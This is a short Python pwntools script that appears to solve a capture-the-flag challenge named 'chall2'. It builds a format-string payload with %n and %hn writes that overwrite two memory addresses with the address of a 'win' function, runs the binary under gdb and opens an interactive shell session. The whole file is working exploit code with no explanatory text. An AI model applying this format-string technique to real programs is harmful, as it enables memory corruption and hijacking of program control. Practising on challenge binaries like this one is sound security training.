from pwn import *

context.log_level = 'error'

script = '''
b *func+192
c
'''

win  = 0x4013ac
mem1 = 0x404028
mem2 = 0x40402a

ELF = './chall2'

def exploit():
    # p = process(ELF)
    p = gdb.debug(ELF, gdbscript=script)
    p.recvuntil(b':')
    
    payload = b''
    payload += f'%{0x40}x'.encode('utf-8')
    payload += b'%11$n'

    payload += f'%{0x13ac-0x40}x'.encode('utf-8')
    payload += b'-%12$hn'
    
    payload += b'B' * 2

    payload += p64(mem2)
    payload += p64(mem1)
    p.send(payload)

    p.sendline(b'END')
    p.interactive()
    # print(p.recvall())

exploit()


# %n -> 4 bytes
